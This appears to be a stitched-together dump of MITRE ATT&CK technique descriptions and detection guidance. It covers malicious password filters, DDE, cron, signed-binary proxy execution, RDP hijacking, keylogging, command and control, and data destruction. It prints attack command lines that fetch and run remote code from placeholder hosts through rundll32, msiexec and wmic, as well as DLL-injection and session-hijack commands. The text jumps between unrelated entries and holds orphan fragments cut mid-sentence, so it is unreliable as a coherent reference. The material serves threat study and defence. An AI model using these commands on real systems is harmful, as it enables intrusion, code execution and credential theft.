        Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.

        Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.

        Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.

        The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.

        Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

        Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

        Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word Dec 2017) (Citation: Microsoft ADV170021 Dec 2017) (Citation: Microsoft DDE Advisory Nov 2017)

        Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands (Citation: SensePost PS DDE May 2016) (Citation: Kettle CSV DDE Aug 2014), directly or through embedded files (Citation: Enigma Reviving DDE Jan 2018), and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros. (Citation: SensePost MacroLess DDE Oct 2017) DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.

        On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ### cron

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ### launchd

        Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

        Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the binary being executed.

        Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious.

        If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

        Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

        It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively.

        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)

        The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

        Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

        Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks.

        Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in <code>%systemroot%\System32\Tasks</code> for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

        Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)

        * Event ID 106 - Scheduled task registered
        * Event ID 140 - Scheduled task updated
        * Event ID 141 - Scheduled task removed

        Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns) Look for changes to tasks that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data.

        Monitor processes and command-line arguments for actions that could be taken to create tasks. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086), so additional logging may need to be configured to gather the appropriate data.

        Utilities such as [at](https://attack.mitre.org/software/S0110) and [schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)

        An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

        Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity.

        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)

        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

        ### Msiexec.exe
        Msiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)

        * <code>msiexec.exe /q /i "C:\path\to\file.msi"</code>
        * <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>
        * <code>msiexec.exe /y "C:\path\to\file.dll"</code>

        ### Mavinject.exe
        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

        * <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>
        * <code>C:\Windows\system32\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>

        ### SyncAppvPublishingServer.exe
        SyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

        ### Odbcconf.exe
        Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)

        * <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>

        Several other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)

        The presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

        Use process monitoring to monitor the execution and arguments of MSBuild.exe, dnx.exe, rcsi.exe, WinDbg.exe, cdb.exe, and tracker.exe. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.

      description: "There are many utilities used for software development related
        tasks that can be used to execute code in various forms to assist in development,
        debugging, and reverse engineering. These utilities may often be signed with
        legitimate certificates that allow them to execute on a system and proxy execution
        of malicious code through a trusted process that effectively bypasses application
        whitelisting defensive solutions.\n\n### MSBuild\n\nMSBuild.exe (Microsoft
        Build Engine) is a software build platform used by Visual Studio. It takes
        XML formatted project files that define requirements for building various
        platforms and configurations. (Citation: MSDN MSBuild) \n\nAdversaries can
        use MSBuild to proxy execution of code through a trusted Windows utility.
        The inline task capability of MSBuild that was introduced in .NET version
        4 allows for C# code to be inserted into the XML project file. (Citation:
        MSDN MSBuild) Inline Tasks MSBuild will compile and execute the inline task.
        MSBuild.exe is a signed Microsoft binary, so when it is used this way it can
        execute arbitrary code and bypass application whitelisting defenses that are
        configured to allow MSBuild.exe execution. (Citation: SubTee GitHub All The
        Things Application Whitelisting Bypass)\n\n### DNX\n\nThe .NET Execution Environment
        (DNX), dnx.exe, is a software development kit packaged with Visual Studio
        Enterprise. It was retired in favor of .NET Core CLI in 2016. (Citation: Microsoft
        Migrating from DNX) DNX is not present on standard builds of Windows and may
        only be present on developer workstations using older versions of .NET Core
        and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn
        adversary can use dnx.exe to proxy execution of arbitrary code to bypass application
        whitelist policies that do not account for DNX. (Citation: engima0x3 DNX Bypass)\n\n###
        RCSI\n\nThe rcsi.exe utility is a non-interactive command-line interface for
        C# that is similar to csi.exe. It was provided within an early version of
        the Roslyn .NET Compiler Platform but has since been deprecated for an integrated
        solution. (Citation: Microsoft Roslyn CPT RCSI) The rcsi.exe binary is signed
        by Microsoft. (Citation: engima0x3 RCSI Bypass)\n\nC# .csx script files can
        be written and executed with rcsi.exe at the command-line. An adversary can
        use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting
        policies that do not account for execution of rcsi.exe. (Citation: engima0x3
        RCSI Bypass)\n\n### WinDbg/CDB\n\nWinDbg is a Microsoft Windows kernel and
        user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe
        is also user-mode debugger. Both utilities are included in Windows software
        development kits and can be used as standalone tools. (Citation: Microsoft
        Debugging Tools for Windows) They are commonly used in software development
        and reverse engineering and may not be found on typical Windows systems. Both
        WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can
        use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass
        application whitelist policies that do not account for execution of those
        utilities. (Citation: Exploit Monday WinDbg)\n\nIt is likely possible to use
        other debuggers for similar purposes, such as the kernel-mode debugger kd.exe,
        which is also signed by Microsoft.\n\n### Tracker\n\nThe file tracker utility,
        tracker.exe, is included with the .NET framework as part of MSBuild. It is
        used for logging calls to the Windows file system. (Citation: Microsoft Docs
        File Tracking)\n\nAn adversary can use tracker.exe to proxy execution of an
        arbitrary DLL into another process. Since tracker.exe is also signed it can
        be used to bypass application whitelisting solutions. (Citation: Twitter SubTee
        Tracker.exe)"

RPCS operates over port 135. (Citation: MSDN WMI)

        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.

        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)

        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)

        * <code>msxsl.exe customers[.]xml script[.]xsl</code>

        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.

        Command-line examples: (Citation: subTee WMIC XSL APR 2018)

        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

        ### Windows

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ### Mac

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

        authentication steps that require a cleartext password, moving directly into
        the portion of the authentication that uses the password hash. In this technique,
        valid password hashes for the account being used are captured using a Credential
        Access technique. Captured hashes are used with PtH to authenticate as that

        Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        Also, set up process monitoring for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to prevent RDP session hijacking.

        Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.

        Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)

        Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)

        Monitor for file creation and files transferred within a network over SMB. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.

        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

        Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095).

        Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.

        An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

        In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)

        Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsyncKeyState. (Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.

        Adversaries can use methods of capturing user input for obtaining credentials for [Valid Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that include keylogging and user input field interception.

        Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to target information for specific purposes, such as performing a UAC prompt or wrapping the Windows default credential provider. (Citation: Wrightson 2012)

        Keylogging is likely to be used to acquire credentials for new access opportunities when [Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to remain passive on a system for a period of time before an opportunity arises.

        Adversaries may also install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.

        Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.

        If the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)

        Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.

        Other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)

        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.

        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.

        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).

        A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)

        The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.

        The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

        Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

        For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.

        Adversaries may destroy data data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.

        Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)

        accounts can cover users, administrators, and services.\n\nCompromised credentials

        Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) and [Scripting](https://attack.mitre.org/techniques/T1064).

        Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

        There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
